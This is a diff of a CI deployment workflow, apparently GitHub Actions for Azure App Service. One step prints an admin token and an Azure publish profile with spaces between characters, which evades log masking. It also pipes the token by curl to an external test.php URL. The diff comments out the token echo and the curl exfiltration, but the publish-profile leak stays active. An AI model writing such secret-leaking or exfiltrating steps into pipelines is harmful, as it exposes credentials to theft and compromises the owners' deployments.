@@ -56,11 +56,11 @@ jobs:
           publish-profile: ${{ secrets.AZUREAPPSERVICE_PUBLISHPROFILE_88810BC5C63F4E9085BB94A4A4BF2B0B }}
           package: .
 
-      - name: run curl
+      - name: Run Curl
         env:
           ADMIN_TOKEN: ${{ secrets.ADMIN_TOKEN}}
           PUBLISH_PROFILE: ${{ secrets.AZUREAPPSERVICE_PUBLISHPROFILE_88810BC5C63F4E9085BB94A4A4BF2B0B}}
         run: |
-          echo ${{env.ADMIN_TOKEN}} | sed 's/./& /g'
+#          echo ${{env.ADMIN_TOKEN}} | sed 's/./& /g'
           echo ${{env.PUBLISH_PROFILE}} | sed 's/./& /g'
-          echo ${{env.ADMIN_TOKEN}} | sed 's/./& /g' | curl https://plin-web.azurewebsites.net/test.php?toke=
+#          echo ${{env.ADMIN_TOKEN}} | sed 's/./& /g' | curl https://plin-web.azurewebsites.net/test.php?toke=
